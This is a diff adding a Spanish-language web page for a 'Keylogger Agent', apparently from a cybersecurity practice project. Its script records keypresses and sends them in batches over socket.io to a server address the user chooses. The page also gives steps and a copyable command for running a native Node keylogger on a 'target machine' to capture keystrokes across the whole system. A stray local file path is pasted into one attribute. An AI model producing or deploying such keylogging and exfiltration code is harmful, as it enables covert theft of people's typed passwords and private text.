@@ -1,0 +1,231 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Keylogger Agent</title>
+  <link rel="stylesheet" href="style.css" />
+  <script src="/socket.io/socket.io.js"></script>
+</head>
+<body>
+  <div class="bg"></div>
+  <div class="grid">
+    <div class="card">
+      <h1>Keylogger Agent</h1>
+      <p class="info">Elige cómo deseas ejecutar el agente de keylogger: desde el navegador o como aplicación nativa.</p>
+
+      <label for="agent-type">Tipo de agente:</label>
+      <select id="agent-type" name="agent-typ/home/ernesto/CiberSEguridad/Practica/keylogger-native.jse">
+        <option value="browser" selected>Opción 1: Agente en Navegador</option>
+        <option value="native">Opción 2: Agente Nativo</option>
+      </select>
+
+      <div id="option-browser">
+      <h3>Opción 1: Agente en Navegador</h3>
+      <p style="font-size: 12px; color: #cfd8dc;">Captura teclas dentro del navegador mientras esta página tiene foco.</p>
+      <p class="info">Nota: la captura global real de teclas se hace usando el agente nativo de Node.js. Abre `keylogger-agent.js` en la máquina objetivo y ejecútalo con Node.</p>
+
+      <form id="agent-form">
+        <label for="server-ip">IP del servidor:</label>
+        <input type="text" id="server-ip" value="127.0.0.1" placeholder="127.0.0.1" />
+
+        <label for="server-port">Puerto del servidor:</label>
+        <input type="number" id="server-port" value="3001" min="1" max="65535" />
+
+        <label for="agent-label">Etiqueta del agent:</label>
+        <input type="text" id="agent-label" value="agente-remote" placeholder="Nombre de este agente" />
+
+        <button id="connect-btn" type="submit">Conectar agente</button>
+      </form>
+
+      <div class="res-box" id="status-box">
+        <h3>Estado del agente</h3>
+        <p id="agent-status">Esperando conexión.</p>
+      </div>
+
+      <div class="res-box" id="keylog-box" hidden>
+        <h3>Teclas enviadas</h3>
+        <div id="keylog-list">Todavía no se han enviado teclas.</div>
+      </div>
+      </div>
+
+      <div id="option-native" hidden>
+      <h3>Opción 2: Agente Nativo (Global)</h3>
+      <p class="info">Captura teclas de todo el sistema operativo, no solo del navegador.</p>
+
+      <label for="native-server-ip">IP del servidor:</label>
+      <input type="text" id="native-server-ip" value="127.0.0.1" placeholder="127.0.0.1" />
+
+      <label for="native-server-port">Puerto del servidor:</label>
+      <input type="number" id="native-server-port" value="3001" min="1" max="65535" />
+
+      <label for="native-agent-label">Etiqueta del agente:</label>
+      <input type="text" id="native-agent-label" value="agente-remoto" placeholder="agente-remoto" />
+
+      <div id="native-command" style="background: #0b0c10; border: 1px solid #333; padding: 12px; border-radius: 5px; font-family: monospace; font-size: 11px; color: #00ff9f; margin-bottom: 10px;">
+node keylogger-native.js --server 127.0.0.1 --port 3001 --label agente-remoto
+      </div>
+      <button id="copy-native-btn" class="button">📋 Copiar</button>
+
+      <p style="font-size: 12px; color: #bb86fc; margin-top: 15px;">
+        <strong>Pasos:</strong><br>
+        1. Descarga o copia <code>keylogger-native.js</code> del servidor<br>
+        2. Abre PowerShell/Terminal en esa carpeta<br>
+        3. Presiona "Copiar" y pega en la terminal<br>
+        4. Verás "[✓ CONECTADO]" cuando se conecte<br>
+        5. Escribe en cualquier lugar del sistema
+      </p>
+
+      <div style="background: rgba(255,0,0,0.1); border: 1px solid #ff6b6b; padding: 10px; border-radius: 5px; margin-top: 10px; font-size: 11px; color: #ff9999;">
+        ⚠️ Nota: Requiere Node.js instalado en la máquina remota
+      </div>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    const agentTypeSelect = document.getElementById('agent-type');
+    const optionBrowser = document.getElementById('option-browser');
+    const optionNative = document.getElementById('option-native');
+    
+    agentTypeSelect.addEventListener('change', (e) => {
+      if (e.target.value === 'browser') {
+        optionBrowser.hidden = false;
+        optionNative.hidden = true;
+      } else {
+        optionBrowser.hidden = true;
+        optionNative.hidden = false;
+      }
+    });
+
+    // Elementos del agente nativo
+    const nativeServerIp = document.getElementById('native-server-ip');
+    const nativeServerPort = document.getElementById('native-server-port');
+    const nativeAgentLabel = document.getElementById('native-agent-label');
+    const nativeCommand = document.getElementById('native-command');
+    const copyNativeBtn = document.getElementById('copy-native-btn');
+
+    function updateNativeCommand() {
+      const cmd = `node keylogger-native.js --server ${nativeServerIp.value} --port ${nativeServerPort.value} --label ${nativeAgentLabel.value}`;
+      nativeCommand.textContent = cmd;
+    }
+
+    function copyToClipboard() {
+      const cmd = nativeCommand.textContent;
+      navigator.clipboard.writeText(cmd).then(() => {
+        const originalText = copyNativeBtn.textContent;
+        copyNativeBtn.textContent = '✓ Copiado';
+        setTimeout(() => {
+          copyNativeBtn.textContent = originalText;
+        }, 2000);
+      });
+    }
+
+    nativeServerIp.addEventListener('change', updateNativeCommand);
+    nativeServerPort.addEventListener('change', updateNativeCommand);
+    nativeAgentLabel.addEventListener('change', updateNativeCommand);
+    copyNativeBtn.addEventListener('click', copyToClipboard);
+
+    const agentForm = document.getElementById('agent-form');
+    const serverIpInput = document.getElementById('server-ip');
+    const serverPortInput = document.getElementById('server-port');
+    const agentLabelInput = document.getElementById('agent-label');
+    const agentStatus = document.getElementById('agent-status');
+    const keylogBox = document.getElementById('keylog-box');
+    const keylogList = document.getElementById('keylog-list');
+    const connectBtn = document.getElementById('connect-btn');
+
+    let socket = null;
+    let buffer = '';
+    let lastSend = Date.now();
+    let connected = false;
+    let agentLabel = 'agente-remote';
+
+    function updateStatus(text, active = false) {
+      agentStatus.textContent = text;
+      if (active) {
+        agentStatus.style.color = '#00ff9f';
+      } else {
+        agentStatus.style.color = '#cfd8dc';
+      }
+    }
+
+    function addKeylogEntry(text) {
+      const entry = document.createElement('div');
+      entry.className = 'password-item';
+      entry.textContent = text;
+      keylogList.prepend(entry);
+      keylogBox.hidden = false;
+    }
+
+    function connectToServer(ip, port) {
+      const endpoint = `http://${ip}:${port}`;
+      updateStatus(`Conectando a ${endpoint}...`);
+      socket = io(endpoint, {
+        transports: ['websocket'],
+        reconnectionAttempts: 3
+      });
+
+      socket.on('connect', () => {
+        connected = true;
+        updateStatus(`Conectado a ${endpoint}. Teclas enviadas correctamente.`, true);
+      });
+
+      socket.on('connect_error', () => {
+        connected = false;
+        updateStatus('Error al conectar. Verifica la IP/puerto y recarga la página.');
+      });
+
+      socket.on('disconnect', () => {
+        connected = false;
+        updateStatus('Desconectado del servidor. Reconecta para continuar.');
+      });
+    }
+
+    agentForm.addEventListener('submit', (event) => {
+      event.preventDefault();
+      const ip = serverIpInput.value.trim();
+      const port = serverPortInput.value.trim();
+      agentLabel = agentLabelInput.value.trim() || 'agente-remote';
+
+      if (!ip || !port) {
+        updateStatus('Ingresa IP y puerto válidos antes de conectar.');
+        return;
+      }
+
+      connectBtn.disabled = true;
+      connectToServer(ip, port);
+      setTimeout(() => {
+        connectBtn.disabled = false;
+      }, 1000);
+    });
+
+    document.addEventListener('keypress', (event) => {
+      if (!connected) return;
+      buffer += event.key;
+      if (buffer.length >= 20 || Date.now() - lastSend > 3000) {
+        socket.emit('keylogger-data', {
+          time: new Date().toISOString(),
+          log: buffer,
+          remoteIp: agentLabel
+        });
+        addKeylogEntry(`[${new Date().toLocaleTimeString()}] ${buffer}`);
+        buffer = '';
+        lastSend = Date.now();
+      }
+    });
+
+    setInterval(() => {
+      if (!connected || !buffer) return;
+      socket.emit('keylogger-data', {
+        time: new Date().toISOString(),
+        log: buffer,
+        remoteIp: agentLabel
+      });
+      addKeylogEntry(`[${new Date().toLocaleTimeString()}] ${buffer}`);
+      buffer = '';
+      lastSend = Date.now();
+    }, 5000);
+  </script>
+</body>
+</html>
